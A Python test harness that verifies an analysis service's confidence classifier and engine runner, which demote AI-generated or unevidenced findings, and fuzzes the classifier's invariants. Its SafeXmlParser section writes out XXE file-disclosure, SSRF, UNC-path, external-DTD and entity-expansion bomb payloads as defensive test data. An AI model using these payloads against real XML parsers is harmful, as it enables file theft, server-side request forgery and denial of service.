"""
Empirical Re-Challenge Harness for Milestone 1 Iteration 2:
1. ConfidenceClassifier 12-Case Matrix Verification
2. ConfidenceClassifier AI Detection Vectors & Boundary Stress-Testing
3. EngineRunner AI Flags and Evidence Trust Verification
4. SafeXmlParser Security Invariants & Attack Payloads
5. Invariant Fuzzing Harness (1000 randomized iterations)
"""

import sys
import os
import time
import uuid
import asyncio
import random
from typing import List, Dict, Any

# Ensure services/analysis-python is on sys.path
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "services", "analysis-python"))

import src.engines  # Triggers registration of all 19 engines

from src.models.enums import (
    ConfidenceClass,
    TrustLevel,
    Severity,
    EngineType,
    ArtifactType,
    AnalysisStatus,
)
from src.models.evidence import Evidence
from src.models.finding import Finding
from src.models.request import AnalysisRequest, AnalysisOptions
from src.models.response import AnalysisResponse
from src.platform.confidence import ConfidenceClassifier, CONFIDENCE_SCORE_MAP
from src.core.runner import EngineRunner
from src.core.registry import EngineRegistry
from src.parsers.safe_xml import SafeXmlParser
from src.core.exceptions import SecurityViolationError, EngineNotFoundError


def make_evidence(
    artifact_path: str = "doc.xml",
    provenance: ConfidenceClass = ConfidenceClass.VERIFIED,
    source_type: TrustLevel = TrustLevel.CUSTOMER_EVIDENCE,
) -> Evidence:
    return Evidence(
        artifact_path=artifact_path,
        sha256="a" * 64,
        provenance=provenance,
        source_type=source_type,
    )


def make_finding(
    confidence: ConfidenceClass,
    confidence_score: float = None,
    evidence: List[Evidence] = None,
    is_ai_generated: bool = False,
    technical_details: Dict[str, Any] = None,
) -> Finding:
    if confidence_score is None:
        confidence_score = CONFIDENCE_SCORE_MAP[confidence]
    return Finding(
        rule_id="CHALLENGE_RULE",
        severity=Severity.MAJOR,
        category="CHALLENGE",
        title="Challenge Finding",
        description="Testing invariants",
        confidence=confidence,
        confidence_score=confidence_score,
        remediation="Check finding",
        evidence=evidence if evidence is not None else [],
        is_ai_generated=is_ai_generated,
        technical_details=technical_details or {},
    )


# ============================================================================
# 1. CHALLENGE: 12-CASE MATRIX FOR ConfidenceClassifier.classify
# ============================================================================
def challenge_12_case_matrix():
    print("=" * 80)
    print("CHALLENGE 1: ConfidenceClassifier Full 12-Case Matrix Verification")
    print("=" * 80)

    classes = [
        ConfidenceClass.VERIFIED,
        ConfidenceClass.RULE_DERIVED,
        ConfidenceClass.INFERRED,
        ConfidenceClass.UNKNOWN,
    ]

    ev = make_evidence()
    matrix_results = []
    failures = []

    # Group 1: Unevidenced findings (Non-AI, evidence=[])
    # Expectation: Unconditionally demote to UNKNOWN (0.30)
    print("\n--- Group 1: Unevidenced findings (Non-AI, evidence=[]) ---")
    for c in classes:
        case_id = f"Group1_Unevidenced_{c.value}"
        f = make_finding(confidence=c, evidence=[], is_ai_generated=False)
        result = ConfidenceClassifier.classify(f, is_ai_generated=False, missing_evidence=False)
        passed = (result.confidence == ConfidenceClass.UNKNOWN and result.confidence_score == 0.30)
        status = "PASS" if passed else "FAIL"
        matrix_results.append((case_id, c.value, result.confidence.value, result.confidence_score, status))
        print(f"  [{status}] {case_id}: Initial {c.value} -> Final {result.confidence.value} ({result.confidence_score})")
        if not passed:
            failures.append(f"{case_id}: Expected UNKNOWN (0.30), got {result.confidence.value} ({result.confidence_score})")

    # Group 2: AI findings without evidence (is_ai_generated=True, evidence=[])
    # Expectation: Unconditionally demote to UNKNOWN (0.30) [precedence over INFERRED]
    print("\n--- Group 2: AI findings without evidence (AI=True, evidence=[]) ---")
    for c in classes:
        case_id = f"Group2_AI_NoEvidence_{c.value}"
        f = make_finding(confidence=c, evidence=[], is_ai_generated=True)
        result = ConfidenceClassifier.classify(f, is_ai_generated=True, missing_evidence=False)
        passed = (result.confidence == ConfidenceClass.UNKNOWN and result.confidence_score == 0.30)
        status = "PASS" if passed else "FAIL"
        matrix_results.append((case_id, c.value, result.confidence.value, result.confidence_score, status))
        print(f"  [{status}] {case_id}: Initial {c.value} -> Final {result.confidence.value} ({result.confidence_score})")
        if not passed:
            failures.append(f"{case_id}: Expected UNKNOWN (0.30), got {result.confidence.value} ({result.confidence_score})")

    # Group 3: AI findings with evidence (is_ai_generated=True, evidence=[ev])
    # Expectation: VERIFIED/RULE_DERIVED demote to INFERRED (0.60), INFERRED stays INFERRED (0.60), UNKNOWN stays UNKNOWN (0.30)
    print("\n--- Group 3: AI findings with evidence (AI=True, evidence=[valid]) ---")
    expected_group3 = {
        ConfidenceClass.VERIFIED: (ConfidenceClass.INFERRED, 0.60),
        ConfidenceClass.RULE_DERIVED: (ConfidenceClass.INFERRED, 0.60),
        ConfidenceClass.INFERRED: (ConfidenceClass.INFERRED, 0.60),
        ConfidenceClass.UNKNOWN: (ConfidenceClass.UNKNOWN, 0.30),
    }
    for c in classes:
        case_id = f"Group3_AI_WithEvidence_{c.value}"
        f = make_finding(confidence=c, evidence=[ev], is_ai_generated=True)
        result = ConfidenceClassifier.classify(f, is_ai_generated=True, missing_evidence=False)
        exp_class, exp_score = expected_group3[c]
        passed = (result.confidence == exp_class and result.confidence_score == exp_score)
        status = "PASS" if passed else "FAIL"
        matrix_results.append((case_id, c.value, result.confidence.value, result.confidence_score, status))
        print(f"  [{status}] {case_id}: Initial {c.value} -> Final {result.confidence.value} ({result.confidence_score}) (Expected: {exp_class.value} {exp_score})")
        if not passed:
            failures.append(f"{case_id}: Expected {exp_class.value} ({exp_score}), got {result.confidence.value} ({result.confidence_score})")

    # Group 4 (Control): Deterministic findings with evidence (Non-AI, evidence=[ev])
    # Expectation: Retain original classes & scores
    print("\n--- Group 4 (Control): Deterministic with evidence (Non-AI, evidence=[valid]) ---")
    expected_group4 = {
        ConfidenceClass.VERIFIED: (ConfidenceClass.VERIFIED, 1.0),
        ConfidenceClass.RULE_DERIVED: (ConfidenceClass.RULE_DERIVED, 0.85),
        ConfidenceClass.INFERRED: (ConfidenceClass.INFERRED, 0.60),
        ConfidenceClass.UNKNOWN: (ConfidenceClass.UNKNOWN, 0.30),
    }
    for c in classes:
        case_id = f"Group4_Deterministic_WithEvidence_{c.value}"
        f = make_finding(confidence=c, evidence=[ev], is_ai_generated=False)
        result = ConfidenceClassifier.classify(f, is_ai_generated=False, missing_evidence=False)
        exp_class, exp_score = expected_group4[c]
        passed = (result.confidence == exp_class and result.confidence_score == exp_score)
        status = "PASS" if passed else "FAIL"
        matrix_results.append((case_id, c.value, result.confidence.value, result.confidence_score, status))
        print(f"  [{status}] {case_id}: Initial {c.value} -> Final {result.confidence.value} ({result.confidence_score})")
        if not passed:
            failures.append(f"{case_id}: Expected {exp_class.value} ({exp_score}), got {result.confidence.value} ({result.confidence_score})")

    total_matrix_cases = len(matrix_results)
    passed_cases = total_matrix_cases - len(failures)
    print(f"\nMatrix Results: {passed_cases}/{total_matrix_cases} PASSED (Failures: {len(failures)})")
    if failures:
        for fail in failures:
            print(f"  FAIL: {fail}")
        raise AssertionError(f"12-Case Matrix verification failed with {len(failures)} failures.")
    print(">>> 12-Case Matrix: ALL 12 MATRIX CASES + 4 CONTROL CASES PASSED EMPIRICALLY.")
    return True


# ============================================================================
# 2. CHALLENGE: AI DETECTION VECTORS & CLASSIFIER INVARIANT STRESS
# ============================================================================
def challenge_ai_detection_vectors():
    print("\n" + "=" * 80)
    print("CHALLENGE 2: AI Detection Vectors & Demotion Robustness")
    print("=" * 80)

    clean_ev = make_evidence()
    inferred_prov_ev = make_evidence(provenance=ConfidenceClass.INFERRED)
    inferred_source_ev = make_evidence(source_type=TrustLevel.INFERRED)

    vectors = [
        ("Vector 1: is_ai_generated parameter",
         lambda: ConfidenceClassifier.classify(
             make_finding(ConfidenceClass.VERIFIED, evidence=[clean_ev]),
             is_ai_generated=True
         )),
        ("Vector 2: finding.is_ai_generated attribute",
         lambda: ConfidenceClassifier.classify(
             make_finding(ConfidenceClass.VERIFIED, evidence=[clean_ev], is_ai_generated=True)
         )),
        ("Vector 3: technical_details['is_ai_generated'] = True",
         lambda: ConfidenceClassifier.classify(
             make_finding(ConfidenceClass.VERIFIED, evidence=[clean_ev], technical_details={"is_ai_generated": True})
         )),
        ("Vector 4: technical_details['ai_generated'] = True",
         lambda: ConfidenceClassifier.classify(
             make_finding(ConfidenceClass.VERIFIED, evidence=[clean_ev], technical_details={"ai_generated": True})
         )),
        ("Vector 5: evidence.provenance == INFERRED",
         lambda: ConfidenceClassifier.classify(
             make_finding(ConfidenceClass.VERIFIED, evidence=[inferred_prov_ev])
         )),
        ("Vector 6: evidence.source_type == TrustLevel.INFERRED",
         lambda: ConfidenceClassifier.classify(
             make_finding(ConfidenceClass.VERIFIED, evidence=[inferred_source_ev])
         )),
        ("Vector 7: Mixed evidence list (2 verified, 1 inferred)",
         lambda: ConfidenceClassifier.classify(
             make_finding(ConfidenceClass.VERIFIED, evidence=[clean_ev, inferred_source_ev, clean_ev])
         )),
        ("Vector 8: Tampered elevated score on AI finding (claims 0.99)",
         lambda: ConfidenceClassifier.classify(
             make_finding(ConfidenceClass.INFERRED, confidence_score=0.99, evidence=[clean_ev], is_ai_generated=True)
         )),
        ("Vector 9: Explicit missing_evidence=True with non-empty evidence list",
         lambda: ConfidenceClassifier.classify(
             make_finding(ConfidenceClass.VERIFIED, evidence=[clean_ev]),
             missing_evidence=True
         )),
        ("Vector 10: AI finding with explicit missing_evidence=True and non-empty evidence",
         lambda: ConfidenceClassifier.classify(
             make_finding(ConfidenceClass.VERIFIED, evidence=[clean_ev], is_ai_generated=True),
             missing_evidence=True
         )),
    ]

    for name, test_fn in vectors:
        result = test_fn()
        if "missing_evidence" in name:
            assert result.confidence == ConfidenceClass.UNKNOWN, f"{name}: Expected UNKNOWN, got {result.confidence}"
            assert result.confidence_score == 0.30, f"{name}: Expected 0.30, got {result.confidence_score}"
            print(f"  [PASS] {name} -> UNKNOWN (0.30)")
        elif "Tampered elevated score" in name:
            assert result.confidence == ConfidenceClass.INFERRED
            assert result.confidence_score == 0.60
            print(f"  [PASS] {name} -> Clamped to 0.60")
        else:
            assert result.confidence == ConfidenceClass.INFERRED, f"{name}: Expected INFERRED, got {result.confidence}"
            assert result.confidence_score <= 0.60, f"{name}: Expected <= 0.60, got {result.confidence_score}"
            print(f"  [PASS] {name} -> INFERRED ({result.confidence_score})")

    print(">>> All 10 AI Detection Vectors strictly enforce invariant boundaries.")
    return True


# ============================================================================
# 3. CHALLENGE: EngineRunner.execute AI FLAGS & EVIDENCE TRUST
# ============================================================================
async def challenge_engine_runner():
    print("\n" + "=" * 80)
    print("CHALLENGE 3: EngineRunner.execute AI Flags & Evidence Trust Verification")
    print("=" * 80)

    engine = EngineRegistry.get(EngineType.OPD_GUARD)
    clean_ev = make_evidence()
    inferred_ev = make_evidence(source_type=TrustLevel.INFERRED)

    # Test 3.1: request.configuration["is_ai_generated"] = True demotes findings with evidence
    async def mock_analyze_verified_findings(request):
        f1 = make_finding(ConfidenceClass.VERIFIED, evidence=[clean_ev])
        f2 = make_finding(ConfidenceClass.RULE_DERIVED, evidence=[clean_ev])
        f3 = make_finding(ConfidenceClass.VERIFIED, evidence=[]) # No evidence!
        return AnalysisResponse(
            job_id=request.job_id,
            engine_type=request.engine_type,
            findings=[f1, f2, f3],
        )

    original_analyze = engine.analyze
    engine.analyze = mock_analyze_verified_findings

    try:
        # Request with configuration["is_ai_generated"] = True
        req_cfg_ai = AnalysisRequest(
            job_id=str(uuid.uuid4()),
            tenant_id=str(uuid.uuid4()),
            project_id=str(uuid.uuid4()),
            engine_type=EngineType.OPD_GUARD,
            configuration={"is_ai_generated": True},
        )
        resp1 = await EngineRunner.execute(req_cfg_ai)
        assert resp1.status == AnalysisStatus.COMPLETED
        assert resp1.findings[0].confidence == ConfidenceClass.INFERRED
        assert resp1.findings[0].confidence_score == 0.60
        assert resp1.findings[1].confidence == ConfidenceClass.INFERRED
        assert resp1.findings[1].confidence_score == 0.60
        assert resp1.findings[2].confidence == ConfidenceClass.UNKNOWN
        assert resp1.findings[2].confidence_score == 0.30
        print("  [PASS] 3.1: request.configuration['is_ai_generated']=True properly demotes evidenced findings to INFERRED(0.60) and unevidenced to UNKNOWN(0.30)")

        # Request with options.custom_params["is_ai_generated"] = True
        req_opt_ai = AnalysisRequest(
            job_id=str(uuid.uuid4()),
            tenant_id=str(uuid.uuid4()),
            project_id=str(uuid.uuid4()),
            engine_type=EngineType.OPD_GUARD,
            options=AnalysisOptions(custom_params={"is_ai_generated": True}),
        )
        resp2 = await EngineRunner.execute(req_opt_ai)
        assert resp2.findings[0].confidence == ConfidenceClass.INFERRED
        assert resp2.findings[0].confidence_score == 0.60
        assert resp2.findings[1].confidence == ConfidenceClass.INFERRED
        assert resp2.findings[1].confidence_score == 0.60
        assert resp2.findings[2].confidence == ConfidenceClass.UNKNOWN
        assert resp2.findings[2].confidence_score == 0.30
        print("  [PASS] 3.2: request.options.custom_params['is_ai_generated']=True properly demotes evidenced findings to INFERRED(0.60) and unevidenced to UNKNOWN(0.30)")

        # Engine attribute engine.is_ai_engine = True
        engine.is_ai_engine = True
        req_normal = AnalysisRequest(
            job_id=str(uuid.uuid4()),
            tenant_id=str(uuid.uuid4()),
            project_id=str(uuid.uuid4()),
            engine_type=EngineType.OPD_GUARD,
        )
        resp3 = await EngineRunner.execute(req_normal)
        assert resp3.findings[0].confidence == ConfidenceClass.INFERRED
        assert resp3.findings[0].confidence_score == 0.60
        assert resp3.findings[1].confidence == ConfidenceClass.INFERRED
        assert resp3.findings[1].confidence_score == 0.60
        assert resp3.findings[2].confidence == ConfidenceClass.UNKNOWN
        assert resp3.findings[2].confidence_score == 0.30
        print("  [PASS] 3.3: engine.is_ai_engine=True properly demotes all evidenced findings to INFERRED(0.60) and unevidenced to UNKNOWN(0.30)")
        del engine.is_ai_engine

        # Test 3.4: Finding-level AI provenance via evidence trust
        async def mock_analyze_mixed_findings(request):
            f_clean = make_finding(ConfidenceClass.VERIFIED, evidence=[clean_ev])
            f_inferred_ev = make_finding(ConfidenceClass.VERIFIED, evidence=[inferred_ev])
            f_ai_field = make_finding(ConfidenceClass.VERIFIED, evidence=[clean_ev], is_ai_generated=True)
            f_tech_details = make_finding(ConfidenceClass.VERIFIED, evidence=[clean_ev], technical_details={"ai_generated": True})
            f_no_ev = make_finding(ConfidenceClass.RULE_DERIVED, evidence=[])
            return AnalysisResponse(
                job_id=request.job_id,
                engine_type=request.engine_type,
                findings=[f_clean, f_inferred_ev, f_ai_field, f_tech_details, f_no_ev],
            )
        engine.analyze = mock_analyze_mixed_findings

        resp4 = await EngineRunner.execute(req_normal)
        assert resp4.findings[0].confidence == ConfidenceClass.VERIFIED
        assert resp4.findings[0].confidence_score == 1.0
        assert resp4.findings[1].confidence == ConfidenceClass.INFERRED
        assert resp4.findings[1].confidence_score == 0.60
        assert resp4.findings[2].confidence == ConfidenceClass.INFERRED
        assert resp4.findings[2].confidence_score == 0.60
        assert resp4.findings[3].confidence == ConfidenceClass.INFERRED
        assert resp4.findings[3].confidence_score == 0.60
        assert resp4.findings[4].confidence == ConfidenceClass.UNKNOWN
        assert resp4.findings[4].confidence_score == 0.30
        print("  [PASS] 3.4: Mixed findings executed cleanly — deterministic findings retain VERIFIED (1.0), AI/inferred evidence demote to INFERRED (0.60), and unevidenced demotes to UNKNOWN (0.30)")

        # Test 3.5: Engine execution exception handling
        async def mock_analyze_crash(request):
            raise RuntimeError("Engine simulated hardware crash")
        engine.analyze = mock_analyze_crash

        resp5 = await EngineRunner.execute(req_normal)
        assert resp5.status == AnalysisStatus.FAILED
        assert "Engine simulated hardware crash" in resp5.error_message
        assert len(resp5.findings) == 0
        assert resp5.metrics.execution_time_ms >= 0
        print("  [PASS] 3.5: EngineRunner gracefully captures engine crashes with status FAILED without propagating exception")

    finally:
        engine.analyze = original_analyze

    print(">>> EngineRunner AI flags & evidence trust invariants strictly verified.")
    return True


# ============================================================================
# 4. CHALLENGE: SafeXmlParser ATTACK PAYLOADS
# ============================================================================
def challenge_safe_xml():
    print("\n" + "=" * 80)
    print("CHALLENGE 4: SafeXmlParser Security Invariants & Attack Suite")
    print("=" * 80)

    attacks = [
        ("XXE Local File Disclosure (SYSTEM file:///)", """<?xml version="1.0"?><!DOCTYPE r [ <!ENTITY x SYSTEM "file:///c:/windows/win.ini"> ]><r>&x;</r>"""),
        ("XXE SSRF Canary (SYSTEM http://)", """<?xml version="1.0"?><!DOCTYPE r [ <!ENTITY x SYSTEM "http://127.0.0.1:9999/canary"> ]><r>&x;</r>"""),
        ("XXE SMB UNC Path (SYSTEM \\\\share)", """<?xml version="1.0"?><!DOCTYPE r [ <!ENTITY x SYSTEM "\\\\evil\\leak"> ]><r>&x;</r>"""),
        ("External DTD inclusion", """<!DOCTYPE r SYSTEM "http://example.com/evil.dtd"><r/>"""),
        ("External Public DTD inclusion", """<!DOCTYPE r PUBLIC "-//OASIS//DTD" "http://example.com/evil.dtd"><r/>"""),
        ("Billion Laughs XML Bomb", """<?xml version="1.0"?><!DOCTYPE l [ <!ENTITY a "a"> <!ENTITY b "&a;&a;"> <!ENTITY c "&b;&b;"> <!ENTITY d "&c;&c;"> ]><l>&d;</l>"""),
        ("Quadratic Blowup Attack", f"""<?xml version="1.0"?><!DOCTYPE r [ <!ENTITY q "{"A"*5000}"> <!ENTITY qq "&q;&q;&q;&q;&q;"> ]><r>&qq;</r>"""),
        ("Benign DTD without entities (forbidden by forbid_dtd)", """<!DOCTYPE root [ <!ELEMENT root (#PCDATA)> ]><root>Hello</root>"""),
    ]

    for name, payload in attacks:
        try:
            SafeXmlParser.parse_string(payload)
            raise AssertionError(f"VULNERABILITY: SafeXmlParser allowed malicious attack: {name}")
        except SecurityViolationError as e:
            print(f"  [BLOCKED] {name} -> SecurityViolationError: {str(e)[:60]}...")

    syntax_corrupt = [
        ("<root><unclosed>", "Unclosed tag"),
        ("not xml at all", "Plain text"),
        ("", "Empty string"),
        ("   \n\t  ", "Whitespace only"),
        ("<root>\x00</root>", "Null byte in text"),
        ("<root attr='unclosed>foo</root>", "Unclosed attribute quote"),
    ]

    for payload, desc in syntax_corrupt:
        try:
            SafeXmlParser.parse_string(payload)
            raise AssertionError(f"VULNERABILITY: Malformed syntax accepted: {desc}")
        except ValueError as e:
            print(f"  [REJECTED] Malformed syntax ({desc}) -> ValueError: {str(e)[:60]}...")

    # Valid XML test
    valid_root = SafeXmlParser.parse_string("<root id='1'><item>valid content</item></root>")
    assert valid_root.tag == "root"
    assert valid_root.attrib["id"] == "1"
    assert valid_root.find("item").text == "valid content"
    print("  [PASS] Valid XML parsed cleanly into ElementTree")

    print(">>> SafeXmlParser: ALL attacks blocked with SecurityViolationError, malformed syntax rejected with ValueError.")
    return True


# ============================================================================
# 5. CHALLENGE: FUZZING INVARIANT STRESS HARNESS (1000 ITERATIONS)
# ============================================================================
def challenge_fuzzing_invariants():
    print("\n" + "=" * 80)
    print("CHALLENGE 5: Empirical Invariant Fuzzing Harness (1,000 iterations)")
    print("=" * 80)

    classes = list(ConfidenceClass)
    trust_levels = list(TrustLevel)
    violations = []
    t0 = time.perf_counter()

    for i in range(1000):
        init_class = random.choice(classes)
        init_score = random.choice([None, random.uniform(0.0, 1.0), 0.999, 1.0, 0.0])
        has_ev = random.choice([True, False])
        is_ai_arg = random.choice([True, False])
        is_ai_field = random.choice([True, False])
        ai_in_tech_details = random.choice([True, False])
        ev_prov = random.choice(classes)
        ev_source = random.choice(trust_levels)
        missing_ev_flag = random.choice([True, False])

        ev_list = []
        if has_ev:
            ev_list = [
                Evidence(
                    artifact_path=f"artifact_{i}.xml",
                    sha256="b" * 64,
                    provenance=ev_prov,
                    source_type=ev_source,
                )
            ]

        tech_details = {}
        if ai_in_tech_details:
            tech_details[random.choice(["is_ai_generated", "ai_generated"])] = True

        f = make_finding(
            confidence=init_class,
            confidence_score=init_score,
            evidence=ev_list,
            is_ai_generated=is_ai_field,
            technical_details=tech_details,
        )

        classified = ConfidenceClassifier.classify(
            f,
            is_ai_generated=is_ai_arg,
            missing_evidence=missing_ev_flag,
        )

        # Expected AI involvement
        expected_ai = (
            is_ai_arg
            or is_ai_field
            or ai_in_tech_details
            or (has_ev and (ev_prov == ConfidenceClass.INFERRED or ev_source == TrustLevel.INFERRED))
        )
        expected_no_evidence = missing_ev_flag or not has_ev

        # Invariant 1: Missing Evidence Precedence
        if expected_no_evidence:
            if classified.confidence != ConfidenceClass.UNKNOWN or classified.confidence_score != 0.30:
                violations.append(f"Iter {i}: Missing evidence invariant failed: got {classified.confidence} ({classified.confidence_score})")

        # Invariant 2: LLM / AI Boundary
        elif expected_ai:
            if classified.confidence in (ConfidenceClass.VERIFIED, ConfidenceClass.RULE_DERIVED):
                violations.append(f"Iter {i}: AI finding escaped demotion: {classified.confidence}")
            if classified.confidence_score > 0.60:
                violations.append(f"Iter {i}: AI finding score {classified.confidence_score} > 0.60")

        # Invariant 3: Clean deterministic finding
        else:
            exp_c = init_class
            exp_s = CONFIDENCE_SCORE_MAP[exp_c]
            if classified.confidence != exp_c or classified.confidence_score != exp_s:
                violations.append(f"Iter {i}: Deterministic finding mutated: expected {exp_c} ({exp_s}), got {classified.confidence} ({classified.confidence_score})")

        # Invariant 4: Score bounds
        if not (0.0 <= classified.confidence_score <= 1.0):
            violations.append(f"Iter {i}: Out of bounds score: {classified.confidence_score}")

    elapsed_ms = (time.perf_counter() - t0) * 1000
    print(f"Completed 1,000 iterations in {elapsed_ms:.2f}ms")
    print(f"Violations detected: {len(violations)}")
    if violations:
        for v in violations[:10]:
            print(f"  VIOLATION: {v}")
        raise AssertionError(f"Fuzzing detected {len(violations)} invariant violations!")

    print(">>> 1,000/1,000 randomized iterations PASSED with ZERO invariant violations.")
    return True


# ============================================================================
# MAIN ENTRYPOINT
# ============================================================================
async def main():
    print("=" * 80)
    print("ERP PREFLIGHT — EMPIRICAL RE-CHALLENGE (M1 ITERATION 2)")
    print("=" * 80)

    challenge_12_case_matrix()
    challenge_ai_detection_vectors()
    await challenge_engine_runner()
    challenge_safe_xml()
    challenge_fuzzing_invariants()

    print("\n" + "=" * 80)
    print("ALL EMPIRICAL CHALLENGES EXECUTED AND PASSED.")
    print("=" * 80)


if __name__ == "__main__":
    asyncio.run(main())
